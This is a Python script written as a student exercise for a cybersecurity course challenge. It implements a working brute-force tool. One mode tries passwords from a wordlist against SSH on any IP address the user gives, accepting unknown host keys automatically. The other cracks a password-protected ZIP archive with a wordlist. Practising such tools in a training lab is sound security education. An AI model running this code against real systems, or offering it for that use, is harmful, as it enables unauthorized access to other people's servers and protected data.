# OPS401D10  Ops Challenge 17
# 01/30/2024
# Dominique Bruso
# Purpose: practice python scripting 
# source: https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-17/challenges/DEMO.md; https://chat.openai.com/share/be6493e4-4018-415b-a397-917cb3b47a95;https://chat.openai.com/share/f422d21e-bbd5-4756-bc96-d606fed42fc2; https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-18/challenges/DEMO.md

#!/usr/bin/env python3

# Import necessary libraries
import paramiko  # For SSH connections
import sys       # For system operations like exiting the script
from zipfile import ZipFile  # For working with ZIP files

# Create an SSH client object for SSH connections
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept unknown host keys

# Function to attempt SSH connection
def ssh_connect(host, username, password):
    try:
        ssh.connect(host, port=22, username=username, password=password)  # Try to connect using the provided credentials
        ssh.close()  # Close the connection after successful login
        return True  # Return True if login is successful
    except paramiko.AuthenticationException:
        return False  # Return False if authentication fails
    except paramiko.SSHException:
        ssh.close()  # Ensure connection is closed on exception
        return False  # Return False if other SSH exceptions occur

# Function to attempt to unzip a password-protected ZIP file using a brute force method
def unzip_zip_file(zipped_file, password_list_file):
    with ZipFile(zipped_file, 'r') as zf:  # Open the ZIP file in read mode
        with open(password_list_file, 'r') as pwlist:  # Open the password list file
            for line in pwlist:  # Iterate over each line/password
                password = line.strip()  # Remove any leading/trailing whitespace
                try:
                    zf.extractall(pwd=bytes(password, 'utf-8'))  # Try to extract all files using the password
                    print(f"Success! The file {zipped_file} has been unzipped with password: {password}")
                    return True  # Return True if the password is correct and extraction is successful
                except RuntimeError:
                    continue  # Continue with the next password upon failure
    return False  # Return False if no passwords succeed

# Main function to handle user input and control the flow of the script
def main():
    mode = input("Enter mode (1 for SSH Brute Force, 2 for ZIP File Brute Force): ")  # Ask the user to choose the operation mode
    
    if mode == "1":
        # SSH Brute Force mode
        host = input("Please provide an IP address to connect to: ")  # Get the target IP address
        username = input("Please provide a username: ")  # Get the username
        input_file_path = input("Please provide the path to the password file: ")  # Get the path to the password file
        
        with open(input_file_path, "r") as input_file:  # Open the password file
            for password in input_file:  # Iterate over each password
                password = password.strip()  # Strip newline characters
                if ssh_connect(host, username, password):  # Attempt to connect with the current password
                    print(f"[*] User: {username} [*] Pass Found: {password}")  # If successful, print the password and exit
                    sys.exit(0)
                else:
                    print("Login incorrect or connection could not be established.")  # Print error message on failure
        print("Password not found in the provided file.")  # Print this if no password succeeds

    elif mode == "2":
        # ZIP File Brute Force mode
        zipped_file = input("Enter the path to the ZIP file: ")  # Get the path to the ZIP file
        password_list_file = input("Enter the path to the password list file: ")  # Get the path to the password list
        
        if unzip_zip_file(zipped_file, password_list_file):  # Attempt to unzip the file with the password list
            print("Successfully found the password for the ZIP file.")  # Success message
        else:
            print("Failed to find the correct password for the ZIP file.")  # Failure message

# Check if the script is executed directly (not imported) and then call the main function
if __name__ == "__main__":
    main()

